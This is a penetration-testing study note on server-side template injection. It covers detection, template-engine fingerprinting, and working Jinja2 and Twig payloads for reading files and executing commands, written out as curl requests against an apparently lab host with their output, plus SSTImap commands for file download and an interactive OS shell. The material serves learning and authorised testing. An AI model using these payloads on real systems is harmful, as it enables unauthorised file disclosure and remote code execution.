---
Primary_category: "[[WEB ATTACKS]]"
title: "SSTI"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Theory*

***Server-Side Template Injection ( SSTI )*** is a vulnerability that occurs when a user-controlled input is incoporated into a server-side template before it's parsed and rendered by the template engine

That is, when the user input is part of the template that is parsed and subsequently compiled, so any template expression that the user provides will be evaluated before rendering

> ***Vulnerable***

```bash
template = "Hello " + user_input
render(template)
```

> ***e.g. User Input →*** **`{{ 7*7 }}`**

```bash title="Parsed Template"
Hello 49
```

In the other hand, if the user input is provided as values to the rendering function, the template engine can handle user input securely as it insert values into the corresponding places in the template

> ***i.e. User input is provided to the rendering function in values and never in the template string***

> ***Not vulnerable***

```bash
template = "Hello {{ name }}"
render(template, name=user_input)
```

So, in a nutshell → 

- ***The user controls the template that the engine will parse → SSTI***

- ***The user controls the data entered into the template → No SSTI***

Depending on the template engine and its configuration, *SSTI* can allow an attacker to evaluate expressions, access internal objects or application data, read files, and in some cases achieve remote code execution on the server

---

#### *Enumeration - Manual*

##### *Identifying an SSTI*

As with other types of injections, the key point is to inject special characters with semantic meaning in template engines and observe the web application behavior

Therefore, we can send the payload below to test for *SSTI* on almost any template engine

```bash
${<{%[%'"}}%\.
```

For instance, we have a web application where we enter a name, and it displays that name in the response

![[SSTI-20260917202026607.webp|450]]

> ***Zoom in***

![[SSTI-20260917202110043.webp|450]]

If we enter the payload above instead of a simple string, we get an *Internal Server Error* in the response

![[SSTI-20260918164702078.webp|450]]

> ***Zoom in***

##### *Identifying the Template Engine*

 Just follow the diagram below from left to right until discovering the template engine used

![[SSTI-20260918165025291.webp|450]]

> ***Zoom in***

Regarding the bottom part, in *Jinja*, the resulte will be *7777777*, while in *Twig*, the result will be *49*

---

#### *Enumeration - Automated*

- ***[SSTImap](https://github.com/vladko312/SSTImap)***

***Setup***

```bash
git clone https://github.com/vladko312/SSTImap SSTImap
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install -r requirements.txt
```

***Usage***

```bash
python3 sstimap.py -u '<TARGET>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 sstimap.py -u 'http://154.57.164.82:32086?name=test'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [+] SSTImap identified the following injection point:
> 
>   Query parameter: name
>   Engine: Twig
>   Injection: *
>   Context: text
>   OS: Linux
>   Technique: render
>   Capabilities:
>     Shell command execution: ok
>     Bind and reverse shell: ok
>     File write: ok
>     File read: ok
>     Code evaluation: ok, php code
> ```
>

---

#### *Exploiting an SSTI - Manual*

##### *Jinja2*

> ***The following TTPs apply when Flask is in use***

*Jinja* is a template engine commonly used in *Python* web frameworks such as *Flask* or *Django*

###### *Information Disclosure*

- ***Web Application Configuration***

```python
{{ config.items() }}
```

![[SSTI-20260918170743030.webp|450]]

> ***Zoom in***

- ***Available built-in functions***

```bash
{{ self.__init__.__globals__.__builtins__ }}
```

![[SSTI-20260918170954223.webp|450]]

> ***Zoom in***

###### *Local File Inclusion*

We can use the latest payload to call the **`open()`** function and disclose any file system content for which the user running the application has read permissions

```python
{{ self.__init__.__globals__.__builtins__.open("<FILE>").read() }}
```

> ***e.g.***

```bash
curl --silent --location --request GET --get --data-urlencode 'name={{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}' 'http://154.57.164.82:32086'
```

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> Hi root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> sys:x:3:3:sys:/dev:/usr/sbin/nologin
> sync:x:4:65534:sync:/bin:/bin/sync
> games:x:5:60:games:/usr/games:/usr/sbin/nologin
> <SNIP>
> ```
>

![[SSTI-20260918173223275.webp|450]]

> ***Zoom in***

###### *Remote Code Execution*

Following the same principle, we can achieve *Remote Code Execution* by leveraging functions provided by the *os* library, such as **`system()`** or **`popen()`**

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('<COMMAND>').read() }}
```

> ***e.g.***

```bash
curl --silent --location --request GET --get --data-urlencode 'name={{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}' 'http://154.57.164.82:32086'
```

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> Hi uid=0(root) gid=0(root) groups=0(root)
> <SNIP>
> ```
>

![[SSTI-20260918173301111.webp|450]]

> ***Zoom in***

##### *Twig*

*Twig* is a template engine for the *PHP* programming language

###### *Information Disclosure*

- ***Information about the current template***

```php
{{ _self }} # OR {{_self}}
```

![[SSTI-20260918173406087.webp|450]]

> ***Zoom in***

###### *Local File Inclusion*

In principle, this is not possible using internal functions directly provided by *Twig*

However, the *PHP* web framework *Symfony* defines additional *Twig* filters, so we can leverage them to disclose any file sistem content for which the current user has read permissions

- **`file_excerpt()`**

```bash
{{ "<FILE>"|file_excerpt(1,-1) }}
```

> ***e.g.***

```bash
curl --silent --location --request GET --get --data-urlencode 'name={{ "/etc/passwd"|file_excerpt(1,-1) }}' 'http://154.57.164.82:31857/index.php'
```

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> Hi root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> sys:x:3:3:sys:/dev:/usr/sbin/nologin
> <SNIP>
> ```
>

![[SSTI-20260918173937843.webp|450]]

> ***Zoom in***

###### *Remote Code Execution*

We can simply use a *PHP* built-in function such as **`system()`**

```bash
{{ ['<COMMAND>'] | filter('<PHP_FUNCTION>') }}
```

> ***e.g.***

```bash
curl --silent --location --request GET --get --data-urlencode 'name={{ ["id"] | filter("system") }}' 'http://154.57.164.82:31857/index.php'
```

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> Hi uid=33(www-data) gid=33(www-data) groups=33(www-data)
> <SNIP>
> ```
>

![[SSTI-20260918174358143.webp|450]]

> ***Zoom in***

---

#### *Exploiting an SSTI - Automated*

##### *File Disclosure*

- ***[SSTImap](https://github.com/vladko312/SSTImap)***

We can download a remote file to our local machine

***Setup***

```bash
git clone https://github.com/vladko312/SSTImap SSTImap
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install -r requirements.txt
```

***Usage***

```bash
python3 sstimap.py -u '<TARGET>' -D '<REMOTE_FILE>' '<LOCAL_FILE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 sstimap.py -u 'http://154.57.164.82:32086?name=test' -D '/etc/passwd' './passwd'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> [+] File downloaded correctly
> ```
>

##### *Remote Code Execution*

###### *Command Execution*

- ***[SSTImap](https://github.com/vladko312/SSTImap)***

***Usage***

```bash
python3 sstimap.py -u '<TARGET>' -S '<COMMAND>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 sstimap.py -u 'http://154.57.164.82:32086?name=test' -S 'id'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```
>

###### *Interactive Shell*

- ***[SSTImap](https://github.com/vladko312/SSTImap)***

***Usage***

```bash
python3 sstimap.py -u '<TARGET>' --os-shell
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 sstimap.py -u 'http://154.57.164.82:32086?name=test' --os-shell
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
><SNIP>
> 
> [+] Run commands on the operating system.
> Linux $ id
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> 
> Linux $ whoami
> www-data
> ```
>

---

#### *Resources*

***[PayloadAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)***